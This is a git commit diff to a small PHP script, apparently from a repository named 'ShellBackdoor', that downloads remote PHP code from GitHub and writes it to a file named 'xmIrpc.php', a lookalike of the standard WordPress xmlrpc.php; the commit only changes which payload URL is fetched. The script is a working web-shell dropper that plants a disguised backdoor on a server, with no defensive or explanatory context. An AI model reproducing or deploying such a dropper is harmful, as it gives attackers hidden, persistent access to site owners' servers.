062fc2747904e2c1bb8416cb8d93dc1fdd9860e2
mr-quixter <77615861+mr-quixter@users.noreply.github.com>
2023-09-17 01:39:33 +0700

    Update hid.php

--- hid.php
+++ hid.php
@@ -1,6 +1,6 @@
 <?php
 $nama= fopen("xmIrpc.php" ,"w+");
-$file = file_get_contents('https://github.com/mr-quixter/ShellBackdoor/raw/main/yx.php');
+$file = file_get_contents('https://github.com/mr-quixter/ShellBackdoor/raw/main/install-ev.php');
 $tulis = fwrite ($nama ,$file);
 fclose($nama);
 ?>
